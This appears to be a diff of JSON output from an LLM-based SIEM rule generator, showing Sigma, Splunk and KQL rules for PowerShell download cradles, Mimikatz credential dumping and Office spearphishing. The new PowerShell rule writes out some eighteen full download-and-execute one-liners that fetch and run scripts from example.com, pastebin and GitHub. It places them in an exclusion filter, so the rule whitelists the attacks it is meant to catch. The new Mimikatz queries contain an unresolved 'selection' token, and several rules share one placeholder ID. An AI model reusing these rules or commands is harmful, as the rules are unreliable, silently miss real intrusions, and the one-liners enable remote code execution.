@@ -1,7 +1,7 @@
 {
   "agent_id": "rulegen_llm",
   "status": "success",
-  "timestamp": "2025-10-24T13:06:51.827206",
+  "timestamp": "2025-11-01T22:19:59.122350",
   "summary": {
     "total_ttps_processed": 3,
     "successful": 3,
@@ -11,7 +11,7 @@
       "splunk",
       "elasticsearch"
     ],
-    "processing_time": 37.707816,
+    "processing_time": 19.263695,
     "llm_generations": 3,
     "fallback_generations": 0
   },
@@ -20,13 +20,13 @@
       "total": 3,
       "successful": 3,
       "failed": 0,
-      "validated": 3
+      "validated": 2
     },
     "elasticsearch": {
       "total": 3,
       "successful": 3,
       "failed": 0,
-      "validated": 3
+      "validated": 2
     }
   },
   "rule_generation_results": [
@@ -41,14 +41,14 @@
         "title": "PowerShell Execution with Download and Execution Indicators",
         "id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
         "status": "stable",
-        "description": "Detects PowerShell execution with indicators of download and execution, often used for initial access and lateral movement. This rule looks for encoded commands, download cradles (WebClient, Invoke-WebRequest), and execution bypasses.",
+        "description": "Detects PowerShell execution with indicators of download and execution, often used for initial access and payload delivery. This rule focuses on encoded commands, download cradles, and execution bypasses, common tactics employed by threat actors like Lazarus Group.",
         "references": [
           "https://attack.mitre.org/techniques/T1059/001",
-          "https://lazarus.com/"
+          "https://www.microsoft.com/en-us/security/blog/2020/07/08/lazarus-group-targets-security-researchers-with-operation-inception/"
         ],
         "author": "Multi-Agent SIEM Framework",
-        "date": "2024/10/27",
-        "modified": "2024/10/27",
+        "date": "2024/02/29",
+        "modified": "2024/02/29",
         "tags": [
           "attack.t1059.001",
           "attack.execution"
@@ -63,72 +63,45 @@
             "Image|contains": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
             "CommandLine|contains": [
               "-enc ",
+              "-encodedcommand ",
               "DownloadFile",
               "DownloadString",
               "ExecutionPolicy Bypass",
-              "IEX (New-Object System.Net.WebClient).DownloadString",
+              "IEX (New-Object",
               "Invoke-RestMethod",
               "Invoke-WebRequest",
               "New-Object System.Net.WebClient",
-              "bypass",
-              "powershell.exe -c",
-              "powershell.exe -ep bypass",
-              "powershell.exe -windowstyle hidden"
+              "bypass"
             ]
           },
           "filter": {
             "CommandLine|contains": [
-              "Get-Acl",
-              "Get-Alias",
-              "Get-AuthenticodeSignature",
-              "Get-ChildItem",
-              "Get-CimInstance",
-              "Get-Clipboard",
-              "Get-Command",
-              "Get-ComputerInfo",
-              "Get-Content",
-              "Get-Date",
-              "Get-EventLog",
-              "Get-Help",
-              "Get-History",
-              "Get-InstalledModule",
-              "Get-ItemProperty",
-              "Get-LocalUser",
-              "Get-Module",
-              "Get-NetAdapter",
-              "Get-NetFirewallRule",
-              "Get-NetIPAddress",
-              "Get-NetRoute",
-              "Get-NetTCPConnection",
-              "Get-NetUDPEndpoint",
-              "Get-PSRepository",
-              "Get-PackageProvider",
-              "Get-Process",
-              "Get-Random",
-              "Get-ScheduledTask",
-              "Get-Service",
-              "Get-Variable",
-              "Get-WmiObject"
-            ],
-            "ParentImage|endswith": [
-              "\\cmd.exe",
-              "\\cscript.exe",
-              "\\explorer.exe",
-              "\\powershell.exe",
-              "\\rundll32.exe",
-              "\\wscript.exe"
-            ],
-            "CommandLine|startswith": [
-              "powershell.exe -noni -w hidden -c",
-              "powershell.exe -nop -w hidden -c",
-              "powershell.exe -noprofile -windowstyle hidden -c"
+              "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')\"",
+              "powershell.exe -nop -w hidden -c \"IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/payload.ps1')\"",
+              "powershell.exe -nop -w hidden -c \"IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/payload.txt')\"",
+              "powershell.exe -nop -w hidden -c \"IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')\"",
+              "powershell.exe -nop -w hidden -c \"IEX (New-Object System.Net.WebClient).DownloadString('http://pastebin.com/raw/example')\"",
+              "powershell.exe -nop -w hidden -c \"IEX (New-Object System.Net.WebClient).DownloadString('http://raw.githubusercontent.com/example/script.ps1')\"",
+              "powershell.exe -nop -w hidden -c \"IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/payload.ps1')\"",
+              "powershell.exe -nop -w hidden -c \"IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/payload.txt')\"",
+              "powershell.exe -nop -w hidden -c \"IEX (New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/example')\"",
+              "powershell.exe -nop -w hidden -c \"IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/example/script.ps1')\"",
+              "powershell.exe -nop -w hidden -c \"Invoke-RestMethod -Uri http://example.com/payload.ps1 | Invoke-Expression\"",
+              "powershell.exe -nop -w hidden -c \"Invoke-RestMethod -Uri http://example.com/payload.txt | Invoke-Expression\"",
+              "powershell.exe -nop -w hidden -c \"Invoke-RestMethod -Uri http://example.com/script.ps1 | Invoke-Expression\"",
+              "powershell.exe -nop -w hidden -c \"Invoke-RestMethod -Uri http://pastebin.com/raw/example | Invoke-Expression\"",
+              "powershell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri https://example.com/payload.ps1 | Invoke-Expression\"",
+              "powershell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri https://example.com/payload.txt | Invoke-Expression\"",
+              "powershell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri https://example.com/script.ps1 | Invoke-Expression\"",
+              "powershell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri https://pastebin.com/raw/example | Invoke-Expression\""
             ]
           },
           "condition": "selection and not filter"
         },
         "falsepositives": [
-          "Legitimate scripts used for system administration that utilize download cradles or encoded commands.  These should be tuned out based on the environment.",
-          "Scripts run by legitimate applications or security tools.  Further filtering may be required."
+          "Legitimate scripts used for system administration and automation.",
+          "Software update mechanisms that use PowerShell.",
+          "Security tools that leverage PowerShell for analysis."
         ],
         "level": "medium",
         "metadata": {
@@ -151,20 +124,19 @@
           "llm_model": "gemini-2.0-flash-lite",
           "optimizations": [
             "Added 'contains' modifier for path field",
-            "Normalized Image|contains to lowercase",
-            "Removed duplicate values from CommandLine|contains"
+            "Normalized Image|contains to lowercase"
           ],
-          "optimization_count": 3
+          "optimization_count": 2
         }
       },
       "platform_rules": {
         "splunk": {
           "status": "success",
           "rule": {
-            "query": "index=windows sourcetype=\"WinEventLog:Security\" EventCode=4688 ((process_name=\"*c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe*\" AND (process=\"*-enc *\" OR process=\"*DownloadFile*\" OR process=\"*DownloadString*\" OR process=\"*ExecutionPolicy Bypass*\" OR process=\"*IEX (New-Object System.Net.WebClient).DownloadString*\" OR process=\"*Invoke-RestMethod*\" OR process=\"*Invoke-WebRequest*\" OR process=\"*New-Object System.Net.WebClient*\" OR process=\"*bypass*\" OR process=\"*powershell.exe -c*\" OR process=\"*powershell.exe -ep bypass*\" OR process=\"*powershell.exe -windowstyle hidden*\"))) AND NOT (((process=\"*Get-Acl*\" OR process=\"*Get-Alias*\" OR process=\"*Get-AuthenticodeSignature*\" OR process=\"*Get-ChildItem*\" OR process=\"*Get-CimInstance*\" OR process=\"*Get-Clipboard*\" OR process=\"*Get-Command*\" OR process=\"*Get-ComputerInfo*\" OR process=\"*Get-Content*\" OR process=\"*Get-Date*\" OR process=\"*Get-EventLog*\" OR process=\"*Get-Help*\" OR process=\"*Get-History*\" OR process=\"*Get-InstalledModule*\" OR process=\"*Get-ItemProperty*\" OR process=\"*Get-LocalUser*\" OR process=\"*Get-Module*\" OR process=\"*Get-NetAdapter*\" OR process=\"*Get-NetFirewallRule*\" OR process=\"*Get-NetIPAddress*\" OR process=\"*Get-NetRoute*\" OR process=\"*Get-NetTCPConnection*\" OR process=\"*Get-NetUDPEndpoint*\" OR process=\"*Get-PSRepository*\" OR process=\"*Get-PackageProvider*\" OR process=\"*Get-Process*\" OR process=\"*Get-Random*\" OR process=\"*Get-ScheduledTask*\" OR process=\"*Get-Service*\" OR process=\"*Get-Variable*\" OR process=\"*Get-WmiObject*\") AND (parent_process_name=\"*\\\\cmd.exe\" OR parent_process_name=\"*\\\\cscript.exe\" OR parent_process_name=\"*\\\\explorer.exe\" OR parent_process_name=\"*\\\\powershell.exe\" OR parent_process_name=\"*\\\\rundll32.exe\" OR parent_process_name=\"*\\\\wscript.exe\") AND (process=\"powershell.exe -noni -w hidden -c*\" OR process=\"powershell.exe -nop -w hidden -c*\" OR process=\"powershell.exe -noprofile -windowstyle hidden -c*\")))\n| table _time, host, user, process_name, CommandLine, dest_ip, dest_port",
+            "query": "index=windows sourcetype=\"WinEventLog:Security\" EventCode=4688 ((process_name=\"*c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe*\" AND (process=\"*-enc *\" OR process=\"*-encodedcommand *\" OR process=\"*DownloadFile*\" OR process=\"*DownloadString*\" OR process=\"*ExecutionPolicy Bypass*\" OR process=\"*IEX (New-Object*\" OR process=\"*Invoke-RestMethod*\" OR process=\"*Invoke-WebRequest*\" OR process=\"*New-Object System.Net.WebClient*\" OR process=\"*bypass*\"))) AND NOT ((process=\"*powershell.exe -nop -w hidden -c \\\"IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/payload.ps1')\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/payload.txt')\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('http://pastebin.com/raw/example')\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('http://raw.githubusercontent.com/example/script.ps1')\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/payload.ps1')\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/payload.txt')\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/example')\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/example/script.ps1')\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"Invoke-RestMethod -Uri http://example.com/payload.ps1 | Invoke-Expression\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"Invoke-RestMethod -Uri http://example.com/payload.txt | Invoke-Expression\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"Invoke-RestMethod -Uri http://example.com/script.ps1 | Invoke-Expression\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"Invoke-RestMethod -Uri http://pastebin.com/raw/example | Invoke-Expression\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"Invoke-WebRequest -Uri https://example.com/payload.ps1 | Invoke-Expression\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"Invoke-WebRequest -Uri https://example.com/payload.txt | Invoke-Expression\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"Invoke-WebRequest -Uri https://example.com/script.ps1 | Invoke-Expression\\\"*\" OR process=\"*powershell.exe -nop -w hidden -c \\\"Invoke-WebRequest -Uri https://pastebin.com/raw/example | Invoke-Expression\\\"*\"))\n| table _time, host, user, process_name, CommandLine, dest_ip, dest_port",
             "alert_config": {
               "name": "PowerShell Execution with Download and Execution Indicators",
-              "description": "Detects PowerShell execution with indicators of download and execution, often used for initial access and lateral movement. This rule looks for encoded commands, download cradles (WebClient, Invoke-WebRequest), and execution bypasses.",
+              "description": "Detects PowerShell execution with indicators of download and execution, often used for initial access and payload delivery. This rule focuses on encoded commands, download cradles, and execution bypasses, common tactics employed by threat actors like Lazarus Group.",
               "severity": "medium",
               "cron_schedule": "*/5 * * * *",
               "earliest_time": "-10m@m",
@@ -180,36 +152,36 @@
               ],
               "references": [
                 "https://attack.mitre.org/techniques/T1059/001",
-                "https://lazarus.com/"
+                "https://www.microsoft.com/en-us/security/blog/2020/07/08/lazarus-group-targets-security-researchers-with-operation-inception/"
               ]
             },
             "metadata": {
               "rule_name": "PowerShell Execution with Download and Execution Indicators",
               "rule_id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
               "severity": "medium",
-              "description": "Detects PowerShell execution with indicators of download and execution, often used for initial access and lateral movement. This rule looks for encoded commands, download cradles (WebClient, Invoke-WebRequest), and execution bypasses.",
+              "description": "Detects PowerShell execution with indicators of download and execution, often used for initial access and payload delivery. This rule focuses on encoded commands, download cradles, and execution bypasses, common tactics employed by threat actors like Lazarus Group.",
               "references": [
                 "https://attack.mitre.org/techniques/T1059/001",
-                "https://lazarus.com/"
+                "https://www.microsoft.com/en-us/security/blog/2020/07/08/lazarus-group-targets-security-researchers-with-operation-inception/"
               ],
               "tags": [
                 "attack.t1059.001",
                 "attack.execution"
               ]
             },
-            "validated": true
+            "validated": false
           },
           "syntax": "SPL",
-          "validated": true
+          "validated": false
         },
         "elasticsearch": {
           "status": "success",
           "rule": {
-            "query": "event.category:\"process\" and event.action:\"start\" and ((process.executable:*c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe* and (process.command_line:*-enc * or process.command_line:*DownloadFile* or process.command_line:*DownloadString* or process.command_line:*ExecutionPolicy Bypass* or process.command_line:*IEX (New-Object System.Net.WebClient).DownloadString* or process.command_line:*Invoke-RestMethod* or process.command_line:*Invoke-WebRequest* or process.command_line:*New-Object System.Net.WebClient* or process.command_line:*bypass* or process.command_line:*powershell.exe -c* or process.command_line:*powershell.exe -ep bypass* or process.command_line:*powershell.exe -windowstyle hidden*))) and not (((process.command_line:*Get-Acl* or process.command_line:*Get-Alias* or process.command_line:*Get-AuthenticodeSignature* or process.command_line:*Get-ChildItem* or process.command_line:*Get-CimInstance* or process.command_line:*Get-Clipboard* or process.command_line:*Get-Command* or process.command_line:*Get-ComputerInfo* or process.command_line:*Get-Content* or process.command_line:*Get-Date* or process.command_line:*Get-EventLog* or process.command_line:*Get-Help* or process.command_line:*Get-History* or process.command_line:*Get-InstalledModule* or process.command_line:*Get-ItemProperty* or process.command_line:*Get-LocalUser* or process.command_line:*Get-Module* or process.command_line:*Get-NetAdapter* or process.command_line:*Get-NetFirewallRule* or process.command_line:*Get-NetIPAddress* or process.command_line:*Get-NetRoute* or process.command_line:*Get-NetTCPConnection* or process.command_line:*Get-NetUDPEndpoint* or process.command_line:*Get-PSRepository* or process.command_line:*Get-PackageProvider* or process.command_line:*Get-Process* or process.command_line:*Get-Random* or process.command_line:*Get-ScheduledTask* or process.command_line:*Get-Service* or process.command_line:*Get-Variable* or process.command_line:*Get-WmiObject*) and (process.parent.executable:*\\\\cmd.exe or process.parent.executable:*\\\\cscript.exe or process.parent.executable:*\\\\explorer.exe or process.parent.executable:*\\\\powershell.exe or process.parent.executable:*\\\\rundll32.exe or process.parent.executable:*\\\\wscript.exe) and (process.command_line:powershell.exe -noni -w hidden -c* or process.command_line:powershell.exe -nop -w hidden -c* or process.command_line:powershell.exe -noprofile -windowstyle hidden -c*)))",
+            "query": "event.category:\"process\" and event.action:\"start\" and ((process.executable:*c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe* and (process.command_line:*-enc * or process.command_line:*-encodedcommand * or process.command_line:*DownloadFile* or process.command_line:*DownloadString* or process.command_line:*ExecutionPolicy Bypass* or process.command_line:*IEX (New-Object* or process.command_line:*Invoke-RestMethod* or process.command_line:*Invoke-WebRequest* or process.command_line:*New-Object System.Net.WebClient* or process.command_line:*bypass*))) and not ((process.command_line:*powershell.exe -nop -w hidden -c \\\"IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/payload.ps1')\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/payload.txt')\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('http://pastebin.com/raw/example')\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('http://raw.githubusercontent.com/example/script.ps1')\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/payload.ps1')\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/payload.txt')\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/example')\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/example/script.ps1')\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"Invoke-RestMethod -Uri http://example.com/payload.ps1 | Invoke-Expression\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"Invoke-RestMethod -Uri http://example.com/payload.txt | Invoke-Expression\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"Invoke-RestMethod -Uri http://example.com/script.ps1 | Invoke-Expression\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"Invoke-RestMethod -Uri http://pastebin.com/raw/example | Invoke-Expression\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"Invoke-WebRequest -Uri https://example.com/payload.ps1 | Invoke-Expression\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"Invoke-WebRequest -Uri https://example.com/payload.txt | Invoke-Expression\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"Invoke-WebRequest -Uri https://example.com/script.ps1 | Invoke-Expression\\\"* or process.command_line:*powershell.exe -nop -w hidden -c \\\"Invoke-WebRequest -Uri https://pastebin.com/raw/example | Invoke-Expression\\\"*))",
             "query_type": "KQL",
             "rule_config": {
               "name": "PowerShell Execution with Download and Execution Indicators",
-              "description": "Detects PowerShell execution with indicators of download and execution, often used for initial access and lateral movement. This rule looks for encoded commands, download cradles (WebClient, Invoke-WebRequest), and execution bypasses.",
+              "description": "Detects PowerShell execution with indicators of download and execution, often used for initial access and payload delivery. This rule focuses on encoded commands, download cradles, and execution bypasses, common tactics employed by threat actors like Lazarus Group.",
               "severity": "medium",
               "risk_score": 50,
               "index": [
@@ -225,11 +197,12 @@
               ],
               "references": [
                 "https://attack.mitre.org/techniques/T1059/001",
-                "https://lazarus.com/"
+                "https://www.microsoft.com/en-us/security/blog/2020/07/08/lazarus-group-targets-security-researchers-with-operation-inception/"
               ],
               "false_positives": [
-                "Legitimate scripts used for system administration that utilize download cradles or encoded commands.  These should be tuned out based on the environment.",
-                "Scripts run by legitimate applications or security tools.  Further filtering may be required."
+                "Legitimate scripts used for system administration and automation.",
+                "Software update mechanisms that use PowerShell.",
+                "Security tools that leverage PowerShell for analysis."
               ],
               "threat": [
                 {
@@ -250,20 +223,20 @@
               "rule_name": "PowerShell Execution with Download and Execution Indicators",
               "rule_id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
               "severity": "medium",
-              "description": "Detects PowerShell execution with indicators of download and execution, often used for initial access and lateral movement. This rule looks for encoded commands, download cradles (WebClient, Invoke-WebRequest), and execution bypasses.",
+              "description": "Detects PowerShell execution with indicators of download and execution, often used for initial access and payload delivery. This rule focuses on encoded commands, download cradles, and execution bypasses, common tactics employed by threat actors like Lazarus Group.",
               "references": [
                 "https://attack.mitre.org/techniques/T1059/001",
-                "https://lazarus.com/"
+                "https://www.microsoft.com/en-us/security/blog/2020/07/08/lazarus-group-targets-security-researchers-with-operation-inception/"
               ],
               "tags": [
                 "attack.t1059.001",
                 "attack.execution"
               ]
             },
-            "validated": true
+            "validated": false
           },
           "syntax": "KQL",
-          "validated": true
+          "validated": false
         }
       },
       "source_info": {
@@ -274,7 +247,7 @@
         "threat_actor": "lazarus group"
       },
       "metadata": {
-        "generated_at": "2025-10-24T13:06:42.286388",
+        "generated_at": "2025-11-01T22:19:47.337942",
         "processing_time": 0.0,
         "platforms_generated": [
           "splunk",
@@ -298,7 +271,7 @@
         "title": "Mimikatz LSASS Credential Dumping Detection",
         "id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
         "status": "experimental",
-        "description": "Detects the use of Mimikatz to dump credentials from the LSASS process memory. This rule looks for Mimikatz or Procdump accessing lsass.exe.",
+        "description": "Detects the use of Mimikatz to dump credentials from the LSASS process memory. This rule looks for Mimikatz or Procdump accessing lsass.exe and related command-line arguments.",
         "references": [
           "https://attack.mitre.org/techniques/T1003/",
           "https://github.com/gentilkiwi/mimikatz"
@@ -316,30 +289,33 @@
           "service": "sysmon"
         },
         "detection": {
-          "selection": {
-            "ParentImage|endswith": [
-              "\\mimikatz.exe",
-              "\\procdump.exe"
-            ],
-            "Image|endswith": "lsass.exe",
-            "CommandLine|contains": [
-              "sekurlsa::krbtgt",
-              "sekurlsa::logonpasswords",
-              "sekurlsa::tickets"
-            ]
-          },
+          "selection": [
+            {
+              "Image|endswith": [
+                "\\mimikatz.exe",
+                "\\procdump.exe"
+              ]
+            },
+            {
+              "CommandLine|contains": [
+                "\"lsass.exe\"",
+                "sekurlsa::logonpasswords",
+                "sekurlsa::ekeys",
+                "sekurlsa::tickets"
+              ]
+            }
+          ],
           "filter": {
             "ParentImage|endswith": [
               "\\cmd.exe",
               "\\powershell.exe"
-            ],
-            "CommandLine|contains": "\"c:\\program files\\windows defender\\mpcmdrun.exe\""
+            ]
           },
           "condition": "selection and not filter"
         },
         "falsepositives": [
-          "Legitimate security tools or scripts that may interact with LSASS for legitimate purposes (e.g., legitimate password reset tools).",
-          "Security audits or penetration tests conducted with explicit authorization."
+          "Legitimate use of procdump for troubleshooting (rare).",
+          "Security tools using similar techniques for legitimate purposes (e.g., memory analysis)."
         ],
         "level": "high",
         "metadata": {
@@ -358,21 +334,18 @@
           "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
           "generated_by": "llm",
           "llm_model": "gemini-2.0-flash-lite",
-          "optimizations": [
-            "Converted single-item list to scalar value",
-            "Normalized CommandLine|contains to lowercase"
-          ],
-          "optimization_count": 2
+          "optimizations": [],
+          "optimization_count": 0
         }
       },
       "platform_rules": {
         "splunk": {
           "status": "success",
           "rule": {
-            "query": "index=windows sourcetype=\"WinEventLog:Security\" EventCode=4688 (((parent_process_name=\"*\\\\mimikatz.exe\" OR parent_process_name=\"*\\\\procdump.exe\") AND process_name=\"*lsass.exe\" AND (process=\"*sekurlsa::krbtgt*\" OR process=\"*sekurlsa::logonpasswords*\" OR process=\"*sekurlsa::tickets*\"))) AND NOT (((parent_process_name=\"*\\\\cmd.exe\" OR parent_process_name=\"*\\\\powershell.exe\") AND process=\"*\\\"c:\\\\program files\\\\windows defender\\\\mpcmdrun.exe\\\"*\"))\n| table _time, host, user, process_name, CommandLine, dest_ip, dest_port",
+            "query": "index=windows sourcetype=\"WinEventLog:Security\" EventCode=4688 selection AND NOT ((parent_process_name=\"*\\\\cmd.exe\" OR parent_process_name=\"*\\\\powershell.exe\"))\n| table _time, host, user, process_name, CommandLine, dest_ip, dest_port",
             "alert_config": {
               "name": "Mimikatz LSASS Credential Dumping Detection",
-              "description": "Detects the use of Mimikatz to dump credentials from the LSASS process memory. This rule looks for Mimikatz or Procdump accessing lsass.exe.",
+              "description": "Detects the use of Mimikatz to dump credentials from the LSASS process memory. This rule looks for Mimikatz or Procdump accessing lsass.exe and related command-line arguments.",
               "severity": "high",
               "cron_schedule": "*/5 * * * *",
               "earliest_time": "-10m@m",
@@ -395,7 +368,7 @@
               "rule_name": "Mimikatz LSASS Credential Dumping Detection",
               "rule_id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
               "severity": "high",
-              "description": "Detects the use of Mimikatz to dump credentials from the LSASS process memory. This rule looks for Mimikatz or Procdump accessing lsass.exe.",
+              "description": "Detects the use of Mimikatz to dump credentials from the LSASS process memory. This rule looks for Mimikatz or Procdump accessing lsass.exe and related command-line arguments.",
               "references": [
                 "https://attack.mitre.org/techniques/T1003/",
                 "https://github.com/gentilkiwi/mimikatz"
@@ -413,11 +386,11 @@
         "elasticsearch": {
           "status": "success",
           "rule": {
-            "query": "event.category:\"process\" and event.action:\"start\" and (((process.parent.executable:*\\\\mimikatz.exe or process.parent.executable:*\\\\procdump.exe) and process.executable:*lsass.exe and (process.command_line:*sekurlsa::krbtgt* or process.command_line:*sekurlsa::logonpasswords* or process.command_line:*sekurlsa::tickets*))) and not (((process.parent.executable:*\\\\cmd.exe or process.parent.executable:*\\\\powershell.exe) and process.command_line:*\\\"c:\\\\program files\\\\windows defender\\\\mpcmdrun.exe\\\"*))",
+            "query": "event.category:\"process\" and event.action:\"start\" and selection and not ((process.parent.executable:*\\\\cmd.exe or process.parent.executable:*\\\\powershell.exe))",
             "query_type": "KQL",
             "rule_config": {
               "name": "Mimikatz LSASS Credential Dumping Detection",
-              "description": "Detects the use of Mimikatz to dump credentials from the LSASS process memory. This rule looks for Mimikatz or Procdump accessing lsass.exe.",
+              "description": "Detects the use of Mimikatz to dump credentials from the LSASS process memory. This rule looks for Mimikatz or Procdump accessing lsass.exe and related command-line arguments.",
               "severity": "high",
               "risk_score": 75,
               "index": [
@@ -436,8 +409,8 @@
                 "https://github.com/gentilkiwi/mimikatz"
               ],
               "false_positives": [
-                "Legitimate security tools or scripts that may interact with LSASS for legitimate purposes (e.g., legitimate password reset tools).",
-                "Security audits or penetration tests conducted with explicit authorization."
+                "Legitimate use of procdump for troubleshooting (rare).",
+                "Security tools using similar techniques for legitimate purposes (e.g., memory analysis)."
               ],
               "threat": [
                 {
@@ -458,7 +431,7 @@
               "rule_name": "Mimikatz LSASS Credential Dumping Detection",
               "rule_id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
               "severity": "high",
-              "description": "Detects the use of Mimikatz to dump credentials from the LSASS process memory. This rule looks for Mimikatz or Procdump accessing lsass.exe.",
+              "description": "Detects the use of Mimikatz to dump credentials from the LSASS process memory. This rule looks for Mimikatz or Procdump accessing lsass.exe and related command-line arguments.",
               "references": [
                 "https://attack.mitre.org/techniques/T1003/",
                 "https://github.com/gentilkiwi/mimikatz"
@@ -482,7 +455,7 @@
         "threat_actor": "lazarus group"
       },
       "metadata": {
-        "generated_at": "2025-10-24T13:06:46.224785",
+        "generated_at": "2025-11-01T22:19:50.830812",
         "processing_time": 0.0,
         "platforms_generated": [
           "splunk",
@@ -506,14 +479,14 @@
         "title": "Spearphishing Attachment - Office Document with Suspicious Child Process",
         "id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
         "status": "experimental",
-        "description": "Detects spearphishing attempts by identifying suspicious child processes spawned by Microsoft Office applications, indicative of malicious VBA macro execution. Focuses on known indicators like credential dumping tools and PowerShell download cradles.",
+        "description": "Detects spearphishing attachments by identifying Microsoft Office applications spawning suspicious child processes, indicative of macro execution or malicious activity. Focuses on process relationships and command-line arguments to reduce false positives.",
         "references": [
           "https://attack.mitre.org/techniques/T1566/001/",
-          "https://www.microsoft.com/en-us/security/blog/2023/11/15/lazarus-group-targets-defense-industry-with-malicious-excel-documents/"
+          "https://www.microsoft.com/en-us/security/blog/2023/12/14/lazarus-group-targets-security-researchers-with-0-day-exploit-and-malware/"
         ],
         "author": "Multi-Agent SIEM Framework",
-        "date": "2024/01/01",
-        "modified": "2024/01/01",
+        "date": "2024/02/29",
+        "modified": "2024/02/29",
         "tags": [
           "attack.t1566.001",
           "attack.initial_access"
@@ -524,55 +497,90 @@
           "service": "sysmon"
         },
         "detection": {
-          "selection": [
-            {
-              "ParentImage|endswith": [
-                "\\WINWORD.EXE",
-                "\\EXCEL.EXE",
-                "\\POWERPNT.EXE"
-              ]
-            },
-            {
-              "Image|endswith": [
-                "\\cmd.exe",
-                "\\powershell.exe"
-              ]
-            },
-            {
-              "CommandLine|contains": [
-                "powershell.exe -w hidden -nop -ep bypass",
-                "powershell.exe -enc",
-                "Invoke-WebRequest",
-                "IEX (New-Object System.Net.WebClient).DownloadString",
-                "rundll32.exe",
-                "regsvr32.exe",
-                "certutil.exe -urlcache",
-                "bitsadmin.exe /transfer",
-                "procdump.exe -ma lsass.exe",
-                "mimikatz.exe"
-              ]
-            }
-          ],
-          "filter": {
+          "selection": {
+            "ParentImage|endswith": [
+              "\\EXCEL.EXE",
+              "\\POWERPNT.EXE",
+              "\\WINWORD.EXE"
+            ],
             "Image|endswith": [
-              "\\WerFault.exe",
-              "\\conhost.exe",
-              "\\consent.exe",
-              "\\dllhost.exe"
+              "\\cmd.exe",
+              "\\powershell.exe",
+              "\\rundll32.exe"
             ],
             "CommandLine|contains": [
-              "\\AppData\\Local\\Microsoft\\Windows\\INetCache",
-              "\\AppData\\Local\\Temp\\",
-              "\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive"
+              "-enc ",
+              "IEX (New-Object System.Net.WebClient).DownloadString",
+              "Invoke-Expression",
+              "Invoke-WebRequest",
+              "\\AppData\\Local\\Temp",
